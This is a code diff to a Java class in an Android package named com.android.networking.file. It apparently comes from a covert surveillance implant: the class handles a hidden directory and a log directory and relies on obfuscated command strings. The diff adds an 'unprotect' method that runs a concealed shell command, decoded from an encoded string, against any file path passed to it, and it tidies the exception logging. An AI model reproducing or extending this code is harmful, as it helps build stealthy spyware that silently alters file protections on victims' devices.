@@ -10,6 +10,7 @@
 package com.android.networking.file;
 
 import java.io.File;
+import java.io.IOException;
 
 import android.database.Cursor;
 import android.os.Environment;
@@ -218,6 +219,18 @@ public class Path {
 		return hidden() + LOG_DIR;
 	}
 
+	public static boolean unprotect(String path) {
+		try {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (unprotect): " + Messages.getString("h_3") + path);
+			}
+			Runtime.getRuntime().exec(Messages.getString("h_3") + path);
+			return true;
+		} catch (IOException e) {
+			return false;
+		}
+	}
+	
 	/**
 	 * Removes the directory.
 	 * 
@@ -260,7 +273,10 @@ public class Path {
 			return bytesAvailable;
 		} catch (Exception ex) {
 			if (Cfg.EXCEPTION) {
-				ex.printStackTrace();
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (freeSpace) ERROR: " + ex);
+				}
+				
 			}
 			return 0;
 		}
